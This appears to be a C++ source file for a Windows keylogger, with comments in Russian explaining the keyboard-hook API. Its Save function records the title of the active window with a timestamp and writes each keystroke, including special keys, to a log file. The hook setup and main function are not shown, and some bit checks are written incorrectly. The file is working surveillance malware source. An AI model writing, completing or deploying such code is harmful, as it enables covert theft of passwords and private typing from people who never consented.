#include <Windows.h>
#include <time.h>
#include <iostream>
#include <fstream>

using namespace std;

//Cохранение в файл 
int Save(int key);

//Функция обратного вызова (получает результат хук-функции и срабатывает при нажатии клавишы)
//Возвращает длинное целое, справа налево + стек очищает сама функция

/*int nCode 
Код, определяющий, как обрабатывать сообщение

Может быть одним из следующих:
HC_ACTION (0) - означает, что параметры wParam и lParam содержат информацию о сообщении
Другие коды, зависящие от типа хука (например, для клавиатурных хуков может быть HC_NOREMOVE)

WPARAM wParam
Содержит дополнительную информацию о сообщении

Тип WPARAM - это UINT_PTR (беззнаковое целое, размером с указатель)

Содержимое зависит от типа хука:

Для клавиатурного хука (WH_KEYBOARD): содержит виртуальный код клавиши

LPARAM lParam
Содержит дополнительную информацию о сообщении

Тип LPARAM - это LONG_PTR (знаковое целое, размером с указатель)

Содержимое зависит от типа хука:

Для клавиатурного хука: указатель на структуру KBDLLHOOKSTRUCT
*/
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

HHOOK hook;

//Чтобы определить, какая кнопка нажата и получить её код
KBDLLHOOKSTRUCT kbStruct;

ofstream file;


extern char prevProg[256];

int Save(int key){
    //Массив для хранения имени открытого окна 
    //char prevProg[256];

    //клавиши мыши
    if(key == 1 || key == 2){
        return 0;
    }

    //дескриптор для программы, запущенной на переднем плане
    HWND foreground = GetForegroundWindow();

    //id потока
    DWORD threadId;

    //Расладка клавиатуры
    HKL keyboatdLayout;

    if(foreground){
        //Получаем id потока
        threadId = GetWindowThreadProcessId(foreground, NULL);
        //Получаем раскладку
        keyboatdLayout = GetKeyboardLayout(threadId);

        //Получаем имя окна
        char crrProg[256];
        GetWindowText(foreground, crrProg, sizeof(crrProg));

        if(strcmp(prevProg, crrProg) != 0){
            strcpy_s(prevProg, crrProg);     
            
            time_t t = time(NULL);

            struct tm * tm = localtime(&t);

            char c[64];

            strftime(c, sizeof(c), "%c", tm);

            file << "\n\n\n[Program: " << crrProg << " Date" << c << "]";
        }

    }

    cout << key << endl;

    if(key == VK_BACK)
        file << "[BACKSPACE]";
    else if(key == VK_RETURN)
        file << "\n";
    else if(key == VK_SPACE)
        file << " ";
    else if(key == VK_TAB)
        file << "[TAB]";
    else if(key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
        file << "[SHIFT]";
    else if(key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
        file << "[CTR]";
    else if(key == VK_ESCAPE)
        file << "[ESC]";    
    else if(key == VK_END)
        file << "[END]";  
    else if(key == VK_HOME)
        file << "[HOME]";
    else if(key == VK_LEFT)
        file << "[LEFT]";   
    else if(key == VK_RIGHT)
        file << "[RIGHT]";   
    else if(key == VK_UP)
        file << "[UP]"; 
    else if(key == VK_DOWN)
        file << "[DOWN]";     
    else if(key == 190 || key == 110)
        file << ".";    
    else if(key == 189 || key == 109)
        file << "-";          
    else{
        char crrKey;

        //проверяем зажат ли капс
        bool isLowerCaseMode = ((GetKeyState(VK_CAPITAL) && 0x0001) == 0);

        //проверяем зажат ли шифт
        if ((GetKeyState(VK_SHIFT) && 0x1000) == 1 ||
            (GetKeyState(VK_LSHIFT) && 0x1000) == 1 ||
            (GetKeyState(VK_RSHIFT) && 0x1000) == 1 ){
                isLowerCaseMode = !isLowerCaseMode;
        }

        //получить символ клавиши по её коду
        crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyboatdLayout);

        if(isLowerCaseMode == 1){
            crrKey = tolower(crrKey);
        }
        

        file << char(crrKey);
    }

    file.flush();

    return 0;

}
